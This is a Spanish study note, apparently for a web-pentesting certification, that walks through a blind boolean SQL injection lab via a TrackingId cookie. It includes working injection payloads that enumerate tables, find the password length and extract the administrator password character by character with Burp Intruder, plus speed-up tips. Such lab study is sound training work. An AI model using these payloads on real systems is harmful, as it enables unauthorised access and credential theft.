---
aliases:
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
  - estado/incompleto
  - cert/cbbh
primary categories:
secondary categories:
tertiary categories:
linked:
---

## 🛠️ Metodología del Ataque (Desglose Lógico)

### 1. Confirmar la Vulnerabilidad
Se verifica si es posible controlar la aparición del mensaje alterando la lógica de la consulta original con matemáticas simples.
- `1=1` (Verdadero) $\rightarrow$ Aparece el mensaje.
- `1=2` (Falso) $\rightarrow$ No aparece el mensaje.

### 2. Enumeración de la Base de Datos
Se lanzan consultas anidadas para verificar la existencia de estructuras internas.
- *¿Existe la tabla `users`?* $\rightarrow$ Verdadero.
- *¿Existe el usuario `administrator`?* $\rightarrow$ Verdadero.

### 3. Determinar la Longitud de la Contraseña
Se incrementa gradualmente el valor de longitud esperado en la consulta hasta que la condición devuelve un Falso.
- `LENGTH(password) > 1` (Verdadero)
- `... > 19` (Verdadero)
- `... > 20` (Falso) $\rightarrow$ Esto indica que la longitud exacta es 20 caracteres.

### 4. Extracción de Datos (Ataque de Diccionario / Fuerza Bruta)
Se utiliza **Burp Intruder** para adivinar carácter por carácter. Se evalúa con la base de datos: *"¿La primera letra de la contraseña es la 'a'?"*, luego la 'b', etc., basándose únicamente en si el servidor devuelve la página con el mensaje de éxito.

---

## 📝 Guía Práctica de Explotación (Laboratorio)

### Fase 1: Preparación e Intercepción
1. Visita la página principal del objetivo.
2. Intercepta y modifica la solicitud que contiene la cookie `TrackingId` *(Asumiremos que el valor original es `TrackingId=xyz`)*.

### Fase 2: Pruebas Booleanas Iniciales
Modifica la cookie para inyectar condiciones lógicas:
```sql
-- Prueba Verdadera (Debe aparecer "Welcome back")
TrackingId=xyz' OR '1'='1

-- Prueba Falsa (NO debe aparecer "Welcome back")
TrackingId=xyz' OR '1'='2
```

### Fase 3: Enumeración Básica
Confirma la existencia de la tabla objetivo y el usuario de alto privilegio:

```SQL
-- Confirmar que existe la tabla 'users'
TrackingId=xyz' OR (SELECT 'a' FROM users LIMIT 1)='a

-- Confirmar que existe el usuario 'administrator'
TrackingId=xyz' OR (SELECT 'a' FROM users WHERE username='administrator')='a
```

### Fase 4: Descubrimiento de Longitud
Determina el número exacto de caracteres de la contraseña iterando el valor numérico:

```SQL
TrackingId=xyz' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```
_Nota: Continuar este proceso manualmente en Repeater hasta que desaparezca el mensaje "Welcome back" (Para este caso, la longitud final es 20)._

### Fase 5: Extracción con Burp Intruder

Se utiliza la función `SUBSTRING()` para aislar un solo carácter de la cadena y compararlo.
1. Envía la solicitud a **Burp Intruder**.
2. Cambia la cookie al siguiente payload, selecciona únicamente la letra `a` final y haz clic en **Add §** para crear el marcador de posición del payload:
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```
3. **Configuración de Payloads**:
    - Tipo: _Simple list_.
    - Rango: Letras `a - z` y números `0 - 9`.
4. **Configuración de Grep - Match** (Pestaña Settings):
    - Borra las entradas por defecto y añade el valor `Welcome back` para identificar respuestas exitosas (True).
5. **Ejecución**:
    - Inicia el ataque. La fila que tenga un _tick_ en la columna "Welcome back" contiene el carácter correcto para la posición 1.
6. **Iteración para el resto de la contraseña**:
    - Vuelve a la pestaña Intruder, cambia el desplazamiento en `SUBSTRING(password,1,1)` a `SUBSTRING(password,2,1)` y repite el ataque para descubrir la segunda letra.
    - Repite el proceso modificando el offset (3, 4, 5...) hasta obtener los 20 caracteres completos.
7. **Acceso**: Inicia sesión en _My account_ con las credenciales obtenidas.


---

> [!info] Notas de Optimización Avanzada
> 
> En lugar de iterar sobre cada carácter secuencialmente, este ataque puede optimizarse:
> 
> - **Búsqueda Binaria:** En lugar de igualar (`=`), usar operadores mayor/menor que (`>` o `<`) sobre el valor ASCII de los caracteres para descartar la mitad de las opciones posibles en cada intento, reduciendo drásticamente el número de peticiones.
>     
> - **Cluster Bomb:** Crear un único ataque en Intruder configurando dos posiciones de payload (una para el offset o posición, y otra para el valor del carácter) procesando todas las permutaciones de forma automatizada.
>     
